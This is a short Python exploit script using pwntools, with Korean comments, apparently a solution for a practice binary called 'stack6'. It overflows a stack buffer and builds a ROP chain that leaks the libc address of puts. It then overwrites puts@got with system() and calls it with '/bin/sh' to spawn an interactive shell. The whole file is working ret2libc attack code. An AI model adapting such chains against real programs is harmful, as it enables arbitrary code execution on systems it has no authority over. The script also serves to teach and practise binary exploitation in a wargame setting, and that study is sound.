from pwn import *

p = process('./stack6')

# ret2libc를 위해
# 사용할 동적 라이브러리 함수인 puts,gets 함수의 plt 및 got 주소들
puts_plt = 0x401050
puts_got = 0x404018
gets_plt = 0x401060
gets_got = 0x404020

# ropgadget 주소들
pop_rdi_ret = 0x4011f3
ret = 0x40101a

# payload 작성
payload = b'A' * 0x48   # 스택 버퍼 덮어주기

# puts(puts@got) 호출하여 puts의 실제 libc 주소 찾기
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)

# gets(puts@got) 호출하여, puts@got 위치에 원하는 값 삽입하도록 함
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(gets_plt)

# gets()에서 삽입된 system()@libc 및 "/bin/sh"를 넣음
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(puts_got+8)  # "/bin/sh"
payload += p64(puts_plt)    # system

p.sendline(payload)
p.recvline()
# 얻어낸 puts_libc 주소값 puts_libc 변수에 저장 후 libc base 주소 구하기
puts_libc = u64(p.recvn(6) + b'\x00\x00')
libc_base = puts_libc - 0x84420
# libc base 주소로 system 주소 계산
system_libc = libc_base + 0x52290

payload2 = p64(system_libc)
payload2 += b'/bin/sh\x00'
p.sendline(payload2)

p.interactive()